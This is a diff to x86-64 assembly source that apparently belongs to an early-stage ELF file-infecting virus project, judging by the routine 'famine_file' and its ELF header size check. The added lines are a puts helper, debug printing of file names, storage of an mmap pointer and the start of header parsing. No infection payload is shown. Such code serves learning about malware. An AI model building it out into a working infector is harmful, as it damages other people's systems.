@@ -13,6 +13,35 @@ exit_prog:
 	mov rdi, 1
 	syscall
 
+;puts
+ft_puts:
+	push rbx
+	push rcx
+	push r8
+	push r9
+	push r10
+	push rax
+	push rsi
+	push rdx
+	push rdi
+
+	call ft_strlen
+	mov rdx, rax
+	mov rax, 1
+	mov rsi, rdi
+	mov rdi, 1
+	syscall
+	pop rdi
+	pop rdx
+	pop rsi
+	pop rax
+	pop r10
+	pop r9
+	pop r8
+	pop rcx
+	pop rbx
+retn
+
 ;this will simply print a newline
 debug:
 	push rbx
@@ -177,6 +206,8 @@ famine_file:
 	sub rsp, 8; int filesize
 	sub rsp, 8; void *file returned by mmap
 	sub rsp, 4 ;fd
+	
+	call ft_puts ;PRINT FNAME FOR DEBUGGING
 
 	call open_file
 	cmp rax, -1
@@ -188,12 +219,21 @@ famine_file:
 	mov rdi, [rsp]; fd
 	lea rsi, [rsp + 12]; &fsize
 	call map_file ; map_file(int fd, int *filesize)
+	mov [rsp+4], rax; stock void *file
 
-
+	; parse MAGIC
+	cmp QWORD [rsp + 12], 52; sizeof(Elf32_Ehdr) == 52, check that fsize > sizeof(Elf32_Ehdr) 
+	jb leave_famine_file
+	
+	; end parse MAGIC
+	
+	
 	leave_famine_file:
 	mov rax, 3 ; close syscall n.
 	mov rdi, [rsp] ; close(fd)
 	syscall
+
+	call debug
 
 	add rsp, 4
 	add rsp, 8
